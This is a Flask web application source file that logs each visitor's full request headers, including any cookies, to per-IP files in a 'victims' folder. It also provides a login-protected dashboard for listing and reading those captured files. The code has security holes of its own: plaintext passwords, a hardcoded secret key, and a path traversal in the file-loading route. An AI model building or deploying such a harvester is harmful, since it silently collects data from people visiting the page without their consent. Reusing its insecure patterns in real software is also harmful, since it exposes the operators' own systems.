import json
import os
from flask import Flask, request, redirect, session, render_template

app = Flask(__name__)
app.secret_key = 'your_secret_key'
# Load the JSON file with user data
with open('users.json', 'r') as f:
    users = json.load(f)

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'username' in session:
        return redirect('/dashboard')
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']

        # Check if the username and password are correct
        if username in users and users[username]['password'] == password:
            # Save the user information in the session
            session['username'] = username
            session['full_name'] = users[username]['full_name']

            # Redirect to the dashboard
            return redirect('/dashboard')

        else:
            # Invalid credentials, render the login page again with an error message
            error = 'Invalid username or password'
            return render_template('login.html', error=error)

    # If the request method is 'GET', just render the login page
    return render_template('login.html')

# Signup route
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']
        full_name = request.form['full_name']

        # Check if the username is already taken
        if username in users:
            error = 'Username is already taken'
            return render_template('signup.html', error=error)

        # Save the new user to the JSON file
        users[username] = {
            'password': password,
            'full_name': full_name
        }
        with open('users.json', 'w') as f:
            json.dump(users, f)

        return redirect('/login')

    # If the request method is 'GET', just render the signup page
    return render_template('signup.html')

# Dashboard route
@app.route('/dashboard')
def dashboard():
    # If the user is not logged in, redirect to the login page
    if 'username' not in session:
        return redirect('/login')
    folder = 'victims'
    files = os.listdir(folder)
    return render_template('dashboard.html', username=session['full_name'], victims_folder=files)

@app.route('/load-file', methods=['POST'])
def load_file():
    if 'username' not in session:
        return redirect('/login')
    else:
        # Get the filename from the POST request
        filename = request.form['name']

        # Open the file and read its contents
        with open('victims/' + filename, 'r') as f:
            file_content = f.read()

        # Render the dashboard template and pass the file content to the template
        return render_template('results.html', file_content=file_content, the_name=filename)

# Logout route
@app.route('/logout')
def logout():
    # Clear the session
    session.clear()

    # Redirect to the login page
    return redirect('/login')

# Index page
@app.route('/')
def index():
    user_ip = request.remote_addr
    with open("victims/"+user_ip+".txt", "w+") as file:
        file.write(str(request.headers))
    return render_template("index.html")

if __name__ == '__main__':
    app.run(host="192.168.0.143")